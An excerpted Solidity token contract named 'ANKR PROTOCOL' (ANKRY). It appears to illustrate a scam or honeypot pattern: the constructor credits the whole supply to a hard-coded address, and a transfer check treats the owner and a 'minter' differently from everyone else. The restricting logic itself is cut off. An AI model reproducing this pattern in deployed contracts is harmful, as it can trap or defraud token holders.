...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _balances[0x9c13a9C6DE0312Cc131CEC6b4d693D560E4c4F71] = _totalsupply;
    }
...
contract ANKRPROTOCOL is ERC20, Ownable {
    ...
    constructor() ERC20("ANKR PROTOCOL", "ANKRY") {
    ...
    function _transfer(
       ...
       if(from != owner() && to != owner() && from != minter && to != minter) {
